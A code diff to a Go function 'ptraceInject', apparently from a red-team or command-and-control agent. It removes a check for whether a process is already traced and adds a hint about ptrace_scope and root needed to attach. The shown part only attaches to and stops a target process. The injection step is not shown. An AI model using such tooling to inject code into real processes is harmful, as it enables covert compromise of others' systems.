@@ -108,20 +108,20 @@ func ptraceInject(args ptraceInjectArgs) structs.CommandResult {
 	runtime.LockOSThread()
 	defer runtime.UnlockOSThread()
 
-	alreadyTraced := isTracedByUs(args.PID)
+	sb.WriteString(fmt.Sprintf("[*] PTRACE_ATTACH to PID %d...\n", args.PID))
+	if err := syscall.PtraceAttach(args.PID); err != nil {
+		hint := ""
+		if err == syscall.EPERM {
+			hint = "\n[*] Hint: check /proc/sys/kernel/yama/ptrace_scope (0=permissive, 1=parent-only). " +
+				"Requires scope=0, CAP_SYS_PTRACE, or running as root."
+		}
+		return errorResult(sb.String() + fmt.Sprintf("[!] PTRACE_ATTACH failed: %v%s\n", err, hint))
+	}
 
 	var ws syscall.WaitStatus
-	if alreadyTraced {
-		sb.WriteString(fmt.Sprintf("[*] PID %d already traced by us (e.g. from spawn), skipping PTRACE_ATTACH\n", args.PID))
-	} else {
-		sb.WriteString(fmt.Sprintf("[*] PTRACE_ATTACH to PID %d...\n", args.PID))
-		if err := syscall.PtraceAttach(args.PID); err != nil {
-			return errorResult(sb.String() + fmt.Sprintf("[!] PTRACE_ATTACH failed: %v\n", err))
-		}
-		if _, err := syscall.Wait4(args.PID, &ws, 0, nil); err != nil {
-			_ = syscall.PtraceDetach(args.PID)
-			return errorResult(sb.String() + fmt.Sprintf("[!] Wait4 failed: %v\n", err))
-		}
+	if _, err := syscall.Wait4(args.PID, &ws, 0, nil); err != nil {
+		_ = syscall.PtraceDetach(args.PID)
+		return errorResult(sb.String() + fmt.Sprintf("[!] Wait4 failed: %v\n", err))
 	}
 	sb.WriteString("[+] Process stopped\n")
 
@@ -287,37 +287,3 @@ func ptraceInject(args ptraceInjectArgs) structs.CommandResult {
 	return successResult(sb.String())
 }
 
-func isTracedByUs(pid int) bool {
-	data, err := os.ReadFile(fmt.Sprintf("/proc/%d/status", pid))
-	if err != nil {
-		return false
-	}
-	var tracerPid int
-	for _, line := range strings.Split(string(data), "\n") {
-		if strings.HasPrefix(line, "TracerPid:") {
-			fmt.Sscanf(line, "TracerPid:\t%d", &tracerPid)
-			break
-		}
-	}
-	if tracerPid == 0 {
-		return false
-	}
-	myPid := os.Getpid()
-	if tracerPid == myPid {
-		return true
-	}
-	// TracerPid may be a thread (TID) in our process group — check its Tgid
-	tracerStatus, err := os.ReadFile(fmt.Sprintf("/proc/%d/status", tracerPid))
-	if err != nil {
-		return false
-	}
-	for _, line := range strings.Split(string(tracerStatus), "\n") {
-		if strings.HasPrefix(line, "Tgid:") {
-			var tgid int
-			if _, err := fmt.Sscanf(line, "Tgid:\t%d", &tgid); err == nil {
-				return tgid == myPid
-			}
-		}
-	}
-	return false
-}
